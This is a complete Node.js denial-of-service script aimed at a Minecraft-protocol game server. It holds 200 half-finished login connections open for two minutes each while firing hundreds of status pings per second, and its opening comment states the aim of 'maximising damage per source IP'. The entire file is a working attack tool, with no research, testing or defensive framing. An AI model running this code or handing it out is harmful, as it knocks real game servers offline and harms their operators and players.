// mix.js <host> <port> <pingRatePerSec>
// Holds slow logins AND fires status pings. Maximises damage per source IP.
const net = require('net');
const crypto = require('crypto');

const HOST = process.argv[2];
const PORT = +process.argv[3];
const RATE = +(process.argv[4] || 400);
const HOLDERS = 200;
const PROTO = 774;

const varint = n => {
  const o = []; n >>>= 0;
  do { let b = n & 0x7f; n >>>= 7; if (n) b |= 0x80; o.push(b); } while (n);
  return Buffer.from(o);
};
const frame = p => Buffer.concat([varint(p.length), p]);

const addr = Buffer.from(HOST);
const port = Buffer.alloc(2);
port.writeUInt16BE(PORT);

const hs = s => frame(Buffer.concat([
  varint(0), varint(PROTO), varint(addr.length), addr, port, varint(s)
]));
const HS_STATUS = hs(1);
const HS_LOGIN = hs(2);
const STATUS_REQ = frame(Buffer.from([0]));

function loginStart() {
  const n = Buffer.from('b' + crypto.randomBytes(8).toString('hex').slice(0, 15));
  return frame(Buffer.concat([varint(0), varint(n.length), n, crypto.randomBytes(16)]));
}

let held = 0, pings = 0, errs = 0;

// --- holders: connect, start login, sit there for 120s ---
function hold() {
  const s = net.createConnection({ host: HOST, port: PORT });
  let done = false, counted = false;
  const next = () => {
    if (done) return;
    done = true;
    if (counted) { held--; counted = false; }
    s.destroy();
    setTimeout(hold, 200);
  };
  s.setNoDelay(true);
  s.on('connect', () => { counted = true; held++; s.write(Buffer.concat([HS_LOGIN, loginStart()])); });
  s.on('error', () => { errs++; next(); });
  s.setTimeout(120000, next);
}

// --- pings: fire and forget ---
function ping() {
  const s = net.createConnection({ host: HOST, port: PORT });
  let done = false;
  const next = () => { if (done) return; done = true; s.destroy(); };
  s.setNoDelay(true);
  s.on('connect', () => { s.write(Buffer.concat([HS_STATUS, STATUS_REQ])); pings++; });
  s.on('data', next);
  s.on('error', () => { errs++; next(); });
  s.setTimeout(3000, next);
}

setInterval(() => console.log(`held=${held} pings=${pings} errs=${errs}`), 5000);
const perTick = Math.max(1, Math.round(RATE / 20));
setInterval(() => { for (let i = 0; i < perTick; i++) ping(); }, 50);
for (let i = 0; i < HOLDERS; i++) setTimeout(hold, i * 25);